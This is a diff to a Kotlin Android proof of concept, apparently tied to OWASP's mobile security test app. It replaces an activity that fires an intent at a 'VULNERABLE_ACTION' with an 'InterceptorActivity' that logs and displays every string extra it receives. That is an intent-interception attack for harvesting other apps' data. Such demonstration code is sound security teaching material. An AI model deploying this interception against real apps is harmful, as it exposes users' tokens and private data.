@@ -1,23 +1,24 @@
-package com.example.intenttrigger
+package com.example.datainteceptor
 
-import android.content.Intent
+import android.app.Activity
 import android.os.Bundle
-import android.widget.Button
-import androidx.appcompat.app.AppCompatActivity
+import android.util.Log
+import android.widget.TextView
 
-class MainActivity : AppCompatActivity() {
+class InterceptorActivity : Activity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        setContentView(R.layout.activity_main)
 
-        val exploitButton: Button = findViewById(R.id.exploitButton)
+        val data = StringBuilder("🎯 Intercepted Data:\n")
 
-        exploitButton.setOnClickListener {
-            val exploitIntent = Intent()
-            exploitIntent.action = "org.owasp.mastestapp.VULNERABLE_ACTION" // The vulnerable intent action
-            exploitIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-
-            startActivity(exploitIntent) // Launch the vulnerable activity
+        intent?.extras?.keySet()?.forEach { key ->
+            val value = intent.getStringExtra(key)
+            data.append("$key: $value\n")
+            Log.w("INTERCEPTOR", "$key = $value")
         }
+
+        val textView = TextView(this)
+        textView.text = data.toString()
+        setContentView(textView)
     }
 }
